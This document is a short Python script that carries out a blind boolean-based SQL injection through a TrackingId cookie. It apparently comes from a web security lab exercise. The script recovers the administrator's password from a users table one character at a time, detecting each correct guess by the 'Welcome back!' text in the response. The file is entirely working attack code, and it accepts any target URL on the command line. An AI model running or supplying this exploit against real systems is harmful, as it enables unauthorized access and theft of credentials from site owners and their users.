import requests
from bs4 import BeautifulSoup
import string
import sys

def make_request(TrackingID):
    cookie = f"TrackingId={TrackingID};"
    header = {
        "Cookie": cookie
    }
    res = requests.get(url, headers=header)
    return res

def search_text(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    if "Welcome back!" in soup.text:
        return True
    else:
        return False

def enumerate_password():
    alphanumeric_characters = string.ascii_lowercase + string.digits
    password = ""
    print(f"Enumerating password...")
    for i in range(1,21):
        for j in alphanumeric_characters:
            TrackingID = f"ABC' OR (select username from users where username='administrator' AND SUBSTRING(password,{i},1)='{j}')='administrator"
            response = make_request(TrackingID)
            if search_text(response):
                password = password + j
                print(j, end='', flush=True)
                break
    print(f"\nThe password is: {password}")

if __name__=="__main__":
    try:
        url = sys.argv[1]
        enumerate_password()
    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://example.com")

